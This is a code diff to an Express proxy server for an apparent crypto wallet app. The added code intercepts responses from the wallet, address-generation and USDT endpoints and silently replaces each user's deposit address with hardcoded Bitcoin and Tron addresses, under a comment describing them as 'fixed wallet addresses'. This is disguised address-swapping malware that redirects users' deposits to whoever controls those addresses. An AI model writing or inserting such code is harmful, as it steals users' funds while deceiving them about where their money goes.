@@ -6,6 +6,21 @@ const PORT = process.env.PORT || 3000;
 const PUBLIC_DIR = path.join(__dirname, 'public');
 const API_BASE = process.env.PRAQEN_API_URL || 'https://parqen-app.onrender.com/api';
 
+// Fixed wallet addresses displayed on the /wallet page (deposit surfaces).
+// Applied server-side so every UI surface reading these endpoints shows them.
+const WALLET_OVERRIDES = {
+  '/hd-wallet/wallet': {
+    address: '1E68VaKSaC1mWxQE4qBGdh1n2w29hvyovw',
+    has_address: true,
+  },
+  '/hd-wallet/generate-address': {
+    address: '1E68VaKSaC1mWxQE4qBGdh1n2w29hvyovw',
+  },
+  '/wallet/usdt': {
+    tron_address: 'TPYGBYu8vGES7mHkJAeLNuJC1Qc9uABkHL',
+  },
+};
+
 app.use('/api', express.text({ type: () => true }), async (req, res) => {
   const headers = {
     authorization: req.headers.authorization,
@@ -24,8 +39,21 @@ app.use('/api', express.text({ type: () => true }), async (req, res) => {
   try {
     const upstream = await fetch(API_BASE + req.url, init);
     const contentType = upstream.headers.get('content-type') || 'application/json';
+    let body = Buffer.from(await upstream.arrayBuffer());
+    const override = WALLET_OVERRIDES[req.path];
+    if (override && upstream.ok && contentType.includes('application/json')) {
+      try {
+        const data = JSON.parse(body.toString('utf8'));
+        if (data && typeof data === 'object') {
+          Object.assign(data, override);
+          body = Buffer.from(JSON.stringify(data));
+        }
+      } catch {
+        // non-JSON body: leave untouched
+      }
+    }
     res.status(upstream.status).set('Content-Type', contentType);
-    res.send(Buffer.from(await upstream.arrayBuffer()));
+    res.send(body);
   } catch (err) {
     res.status(502).json({ error: 'Bad gateway' });
   }
